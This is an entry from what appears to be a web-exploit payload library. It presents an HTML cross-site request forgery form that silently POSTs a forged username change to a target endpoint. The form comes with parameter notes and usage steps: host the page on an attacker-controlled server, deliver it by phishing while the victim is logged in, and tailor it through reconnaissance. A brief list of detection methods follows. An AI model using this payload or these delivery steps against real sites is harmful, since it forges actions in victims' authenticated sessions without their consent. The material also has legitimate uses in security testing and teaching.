---
id: 8d86b39e-c584-4c13-8549-da7724971aaa
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:55:55.408929+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - csrf
  - payload
  - web-exploit
platforms:
  - Web
validated: true
---

# HTML-POST-CSRF-Form

## Code

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

## Description

This HTML code creates a simple form that, when submitted by the victim, sends a POST request to the target endpoint to set the username to a malicious value ('CSRFd'). It exploits the victim's active session to perform the action without authentication, relying on the browser's automatic inclusion of cookies. The form uses 'enctype="text/plain"' to potentially bypass some parsers, and the submit button prompts user interaction to trigger the request.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| action URL | Target endpoint for the POST request | "http://www.example.com/api/setusername" |
| username value | Malicious value to set (hidden input) | "CSRFd" |
| Submit value | Text on the submit button for disguise | "Submit Request" |

## Usage

Embed this code in an HTML page hosted on an attacker-controlled server. Deliver the page via phishing email or malicious link while the victim is authenticated to the target site. Customize the action URL and hidden fields based on reconnaissance of the target's API. The victim must click the submit button to execute the forged request.

## Detection

- Web application firewalls (WAFs) scanning for missing CSRF tokens or suspicious referer headers.
- Server logs showing POST requests from unexpected origins or with mismatched user agents.
- Browser extensions or security tools alerting on cross-site form submissions.
- Monitoring for anomalous account changes (e.g., username modifications) tied to unrelated IP referers.

## Related

- [[procedures/HTML-POST-CSRF-Attack]]
